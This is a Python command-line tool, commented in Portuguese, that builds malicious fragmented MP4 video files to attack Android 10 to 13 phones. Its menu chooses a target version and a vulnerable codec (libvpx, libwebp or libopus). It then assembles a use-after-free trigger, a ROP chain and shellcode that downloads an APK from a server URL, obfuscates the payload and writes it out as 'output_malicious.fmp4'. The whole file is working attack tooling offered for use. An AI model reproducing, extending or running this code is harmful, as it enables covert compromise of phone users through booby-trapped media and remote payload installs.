#!/usr/bin/env python3
"""
Integração de Métodos Modernos na CLI
Extensão para suportar Android 10+ com fMP4
"""

from modern_rop_chain import ModernROPChain, AndroidModernVersion, CodecLibrary
from fmp4_injector import fMP4Injector, FragmentationStrategy
from exploit_selector import ExploitSelector, ExploitGeneration


class ModernExploitHandler:
    """Handler para exploração moderna (Android 10+)"""
    
    @staticmethod
    def generate_payload_modern(
        url: str,
        android_version: str,
        method: str,
        codec: str,
        obfuscate: bool = True
    ) -> bytes:
        """
        Gera payload usando método moderno.
        
        Args:
            url: URL do servidor
            android_version: Versão do Android (10, 11, 12, 13)
            method: Método de exploração
            codec: Codec a explorar
            obfuscate: Se deve ofuscar
            
        Returns:
            bytes: Payload completo
        """
        
        # Mapear versão
        version_map = {
            "10": AndroidModernVersion.ANDROID_10,
            "11": AndroidModernVersion.ANDROID_11,
            "12": AndroidModernVersion.ANDROID_12,
            "13": AndroidModernVersion.ANDROID_13,
        }
        target_version = version_map.get(android_version, AndroidModernVersion.ANDROID_13)
        
        # Mapear codec
        codec_map = {
            "libvpx": CodecLibrary.LIBVPX,
            "libwebp": CodecLibrary.LIBWEBP,
            "libopus": CodecLibrary.LIBOPUS,
        }
        codec_lib = codec_map.get(codec, CodecLibrary.LIBVPX)
        
        # Gerar ROP chain
        rop_gen = ModernROPChain(
            target_version=target_version,
            codec=codec_lib,
            download_url=url,
            obfuscate=obfuscate
        )
        
        # Obter pacote completo
        package = rop_gen.get_complete_exploit_package()
        
        # Combinar componentes
        payload = (
            package["uaf_trigger"] +
            package["rop_chain"] +
            package["shellcode"]
        )
        
        return payload, rop_gen.get_exploit_info()
    
    @staticmethod
    def create_fmp4_exploit(
        payload: bytes,
        output_path: str,
        fragment_count: int = 4,
        strategy: str = "interleaved"
    ) -> bool:
        """
        Cria arquivo fMP4 com payload.
        
        Args:
            payload: Payload a injetar
            output_path: Caminho de saída
            fragment_count: Número de fragments
            strategy: Estratégia de fragmentação
            
        Returns:
            bool: True se sucesso
        """
        
        # Mapear estratégia
        strategy_map = {
            "linear": FragmentationStrategy.LINEAR,
            "interleaved": FragmentationStrategy.INTERLEAVED,
            "obfuscated": FragmentationStrategy.OBFUSCATED,
        }
        frag_strategy = strategy_map.get(strategy, FragmentationStrategy.INTERLEAVED)
        
        # Criar injetor
        injector = fMP4Injector()
        
        # Construir fMP4
        fmp4_data = injector.build_fmp4_file(
            payload=payload,
            fragment_count=fragment_count,
            strategy=frag_strategy
        )
        
        # Salvar
        return injector.save_fmp4(output_path, fmp4_data)


def display_modern_menu():
    """Exibe menu interativo para exploração moderna"""
    
    print("\n" + "="*60)
    print("EXPLORAÇÃO MODERNA - ANDROID 10+")
    print("="*60)
    
    # Versão
    print("\n[VERSÃO DO ANDROID]")
    print("  1) Android 10.0")
    print("  2) Android 11.0")
    print("  3) Android 12.0")
    print("  4) Android 13.0")
    
    version_choice = input("\nEscolha (1-4, padrão 4): ").strip() or "4"
    version_map = {"1": "10", "2": "11", "3": "12", "4": "13"}
    android_version = version_map.get(version_choice, "13")
    
    # Método
    selector = ExploitSelector()
    generation = ExploitGeneration.MODERN
    
    print("\n[MÉTODO DE EXPLORAÇÃO]")
    methods = selector.get_available_methods(generation)
    for i, (key, desc) in enumerate(methods.items(), 1):
        print(f"  {i}) {key.upper():<25} - {desc}")
    
    method_choice = input(f"\nEscolha (1-{len(methods)}, padrão 1): ").strip() or "1"
    method_list = list(methods.keys())
    try:
        method = method_list[int(method_choice) - 1]
    except (ValueError, IndexError):
        method = method_list[0]
    
    # Codec
    print("\n[CODEC]")
    codecs = selector.get_available_codecs(generation)
    for i, (key, desc) in enumerate(codecs.items(), 1):
        print(f"  {i}) {key.upper():<25} - {desc}")
    
    codec_choice = input(f"\nEscolha (1-{len(codecs)}, padrão 1): ").strip() or "1"
    codec_list = list(codecs.keys())
    try:
        codec = codec_list[int(codec_choice) - 1]
    except (ValueError, IndexError):
        codec = codec_list[0]
    
    # Fragmentação
    print("\n[ESTRATÉGIA DE FRAGMENTAÇÃO]")
    strategies = selector.get_available_fragmentation_strategies()
    for i, (key, desc) in enumerate(strategies.items(), 1):
        print(f"  {i}) {key.upper():<25} - {desc}")
    
    strategy_choice = input(f"\nEscolha (1-{len(strategies)}, padrão 2): ").strip() or "2"
    strategy_list = list(strategies.keys())
    try:
        strategy = strategy_list[int(strategy_choice) - 1]
    except (ValueError, IndexError):
        strategy = strategy_list[1]
    
    # Fragmentos
    fragment_count = input("\nNúmero de fragments (padrão 4): ").strip() or "4"
    try:
        fragment_count = int(fragment_count)
    except ValueError:
        fragment_count = 4
    
    # Ofuscação
    obfuscate = input("\nOfuscar? (s/n, padrão s): ").strip().lower() != "n"
    
    # URL
    url = input("\nURL do servidor (ex: http://192.168.1.100:8080/payload.apk): ").strip()
    if not url:
        print("[!] URL é obrigatória")
        return None
    
    # Saída
    output_path = input("\nArquivo de saída (padrão: output_malicious.fmp4): ").strip() or "output_malicious.fmp4"
    
    return {
        "android_version": android_version,
        "method": method,
        "codec": codec,
        "strategy": strategy,
        "fragment_count": fragment_count,
        "obfuscate": obfuscate,
        "url": url,
        "output_path": output_path,
    }


def main():
    """Teste da integração moderna"""
    
    # Exibir menu
    config = display_modern_menu()
    
    if config is None:
        print("[!] Configuração inválida")
        return
    
    print("\n" + "="*60)
    print("GERANDO EXPLOIT MODERNO")
    print("="*60)
    
    # Gerar payload
    print(f"\n[*] Gerando payload para Android {config['android_version']}...")
    payload, info = ModernExploitHandler.generate_payload_modern(
        url=config["url"],
        android_version=config["android_version"],
        method=config["method"],
        codec=config["codec"],
        obfuscate=config["obfuscate"]
    )
    
    print(f"[+] Payload gerado: {info['total_payload_size']} bytes")
    print(f"    - UAF Trigger: {info['uaf_trigger_size']} bytes")
    print(f"    - ROP Chain: {info['rop_chain_size']} bytes")
    print(f"    - Shellcode: {info['shellcode_size']} bytes")
    
    # Criar fMP4
    print(f"\n[*] Criando arquivo fMP4...")
    if ModernExploitHandler.create_fmp4_exploit(
        payload=payload,
        output_path=config["output_path"],
        fragment_count=config["fragment_count"],
        strategy=config["strategy"]
    ):
        print(f"[+] Exploit criado com sucesso: {config['output_path']}")
    else:
        print("[!] Falha ao criar exploit")


if __name__ == "__main__":
    main()
